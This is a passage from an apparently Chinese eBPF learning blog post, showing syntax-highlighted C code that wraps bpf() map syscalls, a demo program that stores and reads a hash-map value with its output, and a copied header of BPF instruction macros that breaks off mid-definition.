</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_LOOKUP_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">,uint64_t </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">flags </span><span style="color:#c0c5ce;">= flags,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_UPDATE_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_delete_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_DELETE_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Error at: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, msg);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> orig_value[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">] = &quot;</span><span style="color:#a3be8c;">1145141919810</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc </span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">envp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> value[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> map_fd;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Creating new eBPF map...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    map_fd = </span><span style="color:#8fa1b3;">bpf_map_create</span><span style="color:#c0c5ce;">(BPF_MAP_TYPE_HASH, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(map_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to create eBPF map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Adding new map of key-&gt;value...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &quot;</span><span style="color:#a3be8c;">ay</span><span style="color:#c0c5ce;">&quot;, orig_value, BPF_ANY) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to update eBPF map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Looking up element in map...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(map_fd, &quot;</span><span style="color:#a3be8c;">ay</span><span style="color:#c0c5ce;">&quot;, value) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up elem in eBPF map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Successfully get the elem of key </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">: </span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">ay</span><span style="color:#c0c5ce;">&quot;, value);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(map_fd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~/ebpf_learn$ sudo ./b
</span><span style="color:#c0c5ce;">[*] Creating new eBPF map...
</span><span style="color:#c0c5ce;">[*] Adding new map of key-&gt;value...
</span><span style="color:#c0c5ce;">[*] Looking up element in map...
</span><span style="color:#c0c5ce;">[+] Successfully get the elem of key ay: 1145141919810
</span></pre>
<p>抄一下a3封装好的常用操作</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#ifndef</span><span style="color:#c0c5ce;"> A3_BPF_INSN_H
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">A3_BPF_INSN_H
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdint.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/bpf.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">net/if.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/if_packet.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">err_print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Run eBPF error: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, msg);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">CODE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)          \
</span><span style="color:#c0c5ce;">    ((</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn) {                                \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">code        </span><span style="color:#c0c5ce;">= CODE,                            \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">dst_reg     </span><span style="color:#c0c5ce;">= DST,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">src_reg     </span><span style="color:#c0c5ce;">= SRC,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">off         </span><span style="color:#c0c5ce;">= OFF,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">imm         </span><span style="color:#c0c5ce;">= IMM                              \
</span><span style="color:#c0c5ce;">})
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">)                     \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU64 | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_X, DST, SRC, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_ALU32_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">)                     \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_X, DST, SRC, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                     \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU64 | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_K, DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_ALU32_IMM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                     \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_K, DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_MOV32_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU64 | BPF_MOV | BPF_K, DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_MOV32_IMM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU | BPF_MOV | BPF_K, DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_LD_IMM64_RAW</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                 \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_LD | BPF_DW | BPF_IMM, DST, SRC, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, (uint32_t) (IMM)),\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, ((uint64_t) (IMM)) &gt;&gt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_LD_IMM64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LD_IMM64_RAW</span><span style="color:#c0c5ce;">(DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#ifndef</span><span style="color:#c0c5ce;"> BPF_PSEUDO_MAP_FD
</span><span style="color:#b48ead;"># define </span><span style="color:#c0c5ce;">BPF_PSEUDO_MAP_FD	</span><span style="color:#d08770;">1
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_LD_MAP_FD</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">MAP_FD</span><span style="color:#c0c5ce;">)                      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LD_IMM64_RAW</span><span style="color:#c0c5ce;">(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* Direct packet access, R0 = *(uint *) (skb-&gt;data + imm32) */
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_LD_ABS</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">SIZE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                           \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_LD | </span><span style="color:#8fa1b3;">BPF_SIZE</span><span style="color:#c0c5ce;">(SIZE) | BPF_ABS, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* dst_reg = *(uint *) (src_reg + off16) */
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">SIZE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_LDX | </span><span style="color:#8fa1b3;">BPF_SIZE</span><span style="color:#c0c5ce;">(SIZE) | BPF_MEM, DST, SRC, OFF, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* *(uint *) (dst_reg + off16) = src_reg */
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">SIZE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_STX | </span><span style="color:#8fa1b3;">BPF_SIZE</span><span style="color:#c0c5ce;">(SIZE) | BPF_MEM, DST, SRC, OFF, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_ATOMIC_OP</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">SIZE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_STX | </span><span style="color:#8fa1b3;">BPF_SIZE</span><span style="color:#c0c5ce;">(SIZE) | BPF_ATOMIC, DST, SRC, OFF, OP)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_STX_XADD</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">SIZE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)               \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ATOMIC_OP</span><span style="color:#c0c5ce;">(SIZE, BPF_ADD, DST, SRC, OFF)
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* *(uint *) (dst_reg + off16) = imm */
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_ST_MEM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">SIZE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)                 \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ST | </span><span style="color:#8fa1b3;">BPF_SIZE</span><span style="color:#c0c5ce;">(SIZE) | BPF_MEM, DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, OFF, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_JMP_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)                  \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_X, DST, SRC, OFF, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_JMP32_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP32 | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_X, DST, SRC, OFF, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_JMP_IMM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)                  \
